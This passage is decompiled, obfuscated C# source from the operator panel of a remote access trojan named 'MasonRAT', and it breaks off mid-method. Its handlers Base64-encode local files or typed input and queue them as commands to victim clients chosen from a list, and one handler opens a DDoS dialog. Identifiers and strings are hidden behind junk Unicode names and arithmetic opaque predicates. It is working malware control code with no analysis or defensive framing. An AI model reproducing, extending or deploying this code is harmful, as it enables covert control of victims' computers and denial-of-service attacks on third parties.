    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1524), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1525), DefaultResponse, (34785938 + (1163788884 >> 1451184248) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (190415364 - (990743127 >> 638888371) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % ((1723619893 ^ (1232643574 | 1874514396)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1), (-1103750588 ^ ~506862148) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - (((245593617 > 1120717851 ? -1615872838 : 2009320844) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) << (~694354259 - 1647379281 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0);
    if (str.Length != 0)
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1526) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + str);
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  private void \u2694️MasonRAT\u270C\u060Eۙ\u060E\u0020\u060Cــڦـ\u060B(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1527) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1528));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cۏڙۙ̍ۧۏ\u0020ـ\u060F\u0609(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1529) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1530));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0609\u060Cـ\u0609\u060Dـ̍ﮪڙڛ\u060Dڟ̍ژ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1531) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1532));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609\u0608ۧڼ\u060E\u0608\u060Aـــڕٺ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    if (MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1533), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1534), (MessageBoxButtons) ((903884605 + 235232629 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ~(563526479 - -575590750 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0))) == (DialogResult) ((1936180308 + -1785828883 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ ((1973672424 ^ (1028974091 | 1494292391)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) % (-694973724 - 1649428875 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)))
    {
      try
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1535 /*0x05FF*/) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1536 /*0x0600*/))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cـּبﻻۭٺحټ\u060Dـۡ\u0608ڕـ\u0609ٸـ\u0609ٻ\u0020(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1537) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1538))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Cـۡــى\u060Aم\u060Aــْ̨\u060Aـ(object sender, EventArgs e)
  {
    try
    {
      this.TopMost = true;
      this.WindowState = FormWindowState.Normal;
      this.TopMost = false;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608\u060Cۛ\u060Cڠگءڙطۡـ\u060D\u0608ڙـۙ\u0608د(
    object sender,
    EventArgs e)
  {
    try
    {
      System.Diagnostics.Process.Start(Application.ExecutablePath);
      this.\u2694️MasonRAT\u270C\u060Dﻻٺدئـڕٺڞ\u060Bٸ̍ﮪ\u0609?.Dispose();
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cﮪـ\u060A\u060Dٺ؁\u0609\u060Bٻ\u060Bـ\u0608ۭـڛ(
    object sender,
    EventArgs e)
  {
    try
    {
      this.\u2694️MasonRAT\u270C\u060Dﻻٺدئـڕٺڞ\u060Bٸ̍ﮪ\u0609?.Dispose();
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0608\u060C\u060Bٽۏـ\u060A\u0609ـ̨ـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1539));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Eﯧـ\u0609ـ\u060Cڅٻ\u060Dـڙ\u0608ـﻻڙ\u060Dـۏ̍ـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    if (MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1540), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1541), (MessageBoxButtons) (((-892708633 ^ 723676789 << 369962673) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (-2060265039 - 696714300 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) % (779248228 - 195863579 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0)) == (DialogResult) ((674564291 % 1609903672 - 1304054150 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - ~(1865353901 + ~1235864036 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)))
    {
      try
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1542) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1543))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cـﻋ\u0609ـ\u060Dـؤ\u060D\u0609ـ\u060Eژڙ؁̍\u060Aؤ\u060Bـ\u0609(
    object sender,
    MouseEventArgs e)
  {
    try
    {
      this.TopMost = true;
      this.WindowState = FormWindowState.Normal;
      this.TopMost = false;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Fۜٻ\u060Dـټڝژڛـڙ\u060Aڙڣ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cٽٺ\u060D\u060Dڅــ̨ټڠـ\u060Fـ\u060Aۛـۛۜ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cﻻ\u060Fٽـڜـ̍ۧـڙٺدڙـּى(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    int num = (int) MyProject.\u2694️MasonRAT\u270C\u060Dطڞڛ\u060F\u060Dټـٽټ\u060Bطـﻋۨ\u060Dﻼ.DDos.ShowDialog();
  }

  private void \u2694️MasonRAT\u270C\u060Dــدــٺــ\u0608ۡـى\u060Bﮪڇــ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1544), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1545), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1546), (450370888 ^ ~1028241868) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - ~((538328511 ^ 126327100 % 894431964) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0, ((165834076 > 1348512167 ? -9 : -7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((1083785571 > 996015866 ? 1633388883 : -2117115452) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 >> ((798954256 > 420980400 ? 2036575420 : -1579533403) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
